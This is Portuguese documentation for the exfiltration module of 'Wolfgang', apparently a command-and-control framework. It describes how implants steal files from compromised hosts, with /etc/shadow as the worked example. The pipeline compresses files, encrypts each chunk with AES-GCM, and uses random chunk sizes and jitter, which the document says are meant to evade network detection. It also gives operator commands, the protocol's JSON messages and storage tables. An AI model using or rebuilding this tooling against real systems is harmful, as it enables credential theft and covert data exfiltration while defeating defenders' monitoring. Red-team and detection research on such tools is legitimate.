    Exfiltracao¶

    O sistema de exfiltracao do Wolfgang permite extrair arquivos de alvos de forma segmentada, criptografada e com jitter para evasao de deteccao de rede.

    Visao geral¶

    A exfiltracao opera em tres fases:

    sequenceDiagram
    participant Op as Operador
    participant API as Teamserver
    participant DB as SQLite
    participant Agent as Implant

    Op->>API: exfil /path/to/file
    API->>Agent: Task (module=exfil)

    Agent->>Agent: Ler arquivo
    Agent->>Agent: SHA256 do original
    Agent->>Agent: Comprimir (gzip)
    Agent->>Agent: Gerar session key AES-256
    Agent->>Agent: Dividir em chunks

    Agent->>API: init (session_id, filename, total_chunks, sha256)
    API->>DB: CreateExfil

    loop Para cada chunk
        Agent->>Agent: Criptografar chunk (AES-GCM)
        Agent->>API: chunk (session_id, index, data)
        API->>DB: AddExfilChunk
        Agent->>Agent: Sleep com jitter
    end

    Agent->>API: complete
    Op->>API: exfils download  
    API->>DB: GetExfilChunks
    API->>Op: Arquivo reassemblado

    Usando exfiltracao¶

    Iniciar exfiltracao¶

    wolfgang [a1b2c3d4]>> exfil /etc/shadow
[*] Task queued: f1e2d3c4 (module=exfil)
[+] Task completed:
exfiltrated /etc/shadow (3 chunks)

    Argumentos opcionais podem ser passados via run:

    wolfgang [a1b2c3d4]>> run exfil {"path":"/var/log/auth.log"}

    Listar sessoes de exfiltracao¶

    wolfgang [a1b2c3d4]>> exfils
ID        FILE          SIZE     PROGRESS  STATUS       CREATED
a1b2c3d4  shadow        2048     3/3       in_progress  2026-03-14 10:30
b2c3d4e5  auth.log      524288   12/15     in_progress  2026-03-14 10:32
c3d4e5f6  database.db   1048576  50/50     completed    2026-03-14 09:15

    Baixar dados exfiltrados¶

    wolfgang [a1b2c3d4]>> exfils download a1b2c3d4 ./shadow.recovered
[+] Exfil data saved: ./shadow.recovered (2048 bytes)

    Configuracao do modulo¶

    O modulo exfil usa ExfilConfig com os seguintes parametros:

    Parametro Padrao Descricao
    MinChunkSize 4 KB Tamanho minimo de cada chunk
    MaxChunkSize 64 KB Tamanho maximo de cada chunk
    MinJitter 500ms Jitter minimo entre chunks
    MaxJitter 3s Jitter maximo entre chunks
    Compress true Comprimir dados com gzip antes de chunking

    O tamanho de cada chunk e aleatorio entre MinChunkSize e MaxChunkSize, usando crypto/rand para gerar o tamanho. Isso varia o padrao de trafego para dificultar deteccao.

    Criptografia¶

    Session key¶

    Para cada exfiltracao, uma session key AES-256 e gerada com crypto/rand (32 bytes). Essa chave e transmitida ao server no payload init.

    Criptografia de chunks¶

    Cada chunk e criptografado individualmente com AES-GCM:

    1. Gera nonce aleatorio (12 bytes via crypto/rand)
    2. Cifra com gcm.Seal(nonce, nonce, plaintext, nil)
    3. Resultado: nonce || ciphertext || tag

    Limpeza de chave¶

    Apos a exfiltracao, a session key e zerada em memoria via zeroKey().

    Chunking¶

    O chunking divide os dados (pos-compressao) em pedacos de tamanho variavel:

    func chunkData(data []byte, minSize, maxSize int) [][]byte
    • Se minSize == maxSize: chunks de tamanho fixo
    • Se minSize < maxSize: tamanho aleatorio por chunk via crypto/rand
    • Ultimo chunk pode ser menor que minSize

    Existe tambem chunkFixed() para divisao em tamanho fixo quando necessario.

    Protocolo de exfiltracao¶

    A comunicacao entre implant e server usa tres tipos de mensagem:

    1. Init¶

    {
  "action": "init",
  "session_id": "a1b2c3d4...",
  "filename": "shadow",
  "total_chunks": 3,
  "total_bytes": 2048,
  "sha256": "e3b0c44298fc...",
  "session_key": "deadbeef..."
}

    O server cria o registro na tabela exfiltrations com status in_progress.

    2. Chunk¶

    {
  "action": "chunk",
  "session_id": "a1b2c3d4...",
  "chunk_index": 0,
  "total_chunks": 3,
  "data": "<encrypted_base64>"
}

    O server armazena na tabela exfil_chunks e incrementa received_chunks.

    3. Complete¶

    {
  "action": "complete",
  "session_id": "a1b2c3d4..."
}

    Finalizacao server-side e feita via API do operador.

    Storage¶

    Tabelas¶

    exfiltrations:

    Coluna Tipo Descricao
    id TEXT PK ID da sessao
    agent_id TEXT FK Agent de origem
    filename TEXT Nome do arquivo original
    total_chunks INTEGER Total esperado de chunks
    received_chunks INTEGER Chunks recebidos ate agora
    total_bytes INTEGER Tamanho total em bytes
    sha256_expected TEXT Hash do arquivo original
    sha256_actual TEXT Hash do arquivo reassemblado
    status TEXT in_progress ou completed
    created_at DATETIME Inicio da exfiltracao
    completed_at DATETIME Finalizacao

    exfil_chunks:

    Coluna Tipo Descricao
    session_id TEXT FK Referencia a exfiltrations.id
    chunk_index INTEGER Indice ordenado do chunk
    data BLOB Dados criptografados
    received_at DATETIME Timestamp de recebimento

    A chave primaria de exfil_chunks e (session_id, chunk_index), prevenindo chunks duplicados.

    Roteamento de resultados¶

    Quando uma task response chega ao listener e o modulo e exfil, o resultado e roteado para o subsistema de exfiltracao via RouteExfilResult():

    func RouteExfilResult(store ExfilStore, agentID, result string) {
    switch p.Action {
    case "init":   store.CreateExfilWithID(...)
    case "chunk":  store.AddExfilChunk(...)
    case "complete": // finalizacao via API
    }
}

    Esse roteamento acontece em todos os listeners (HTTPS, DNS, WebSocket).

    Resumption¶

    O sistema suporta resumption parcial. Se a exfiltracao for interrompida:

    1. O server sabe quais chunks ja foram recebidos (received_chunks)
    2. GetExfilLastChunk() retorna o ultimo chunk recebido
    3. O operador pode consultar o progresso via exfils
    4. Uma nova exfiltracao do mesmo arquivo pode ser iniciada

    Verificacao de integridade¶

    O SHA-256 do arquivo original e calculado antes da compressao e transmitido no init. Na finalizacao, o server pode calcular o hash dos dados reassemblados e comparar com sha256_expected via CompleteExfil().
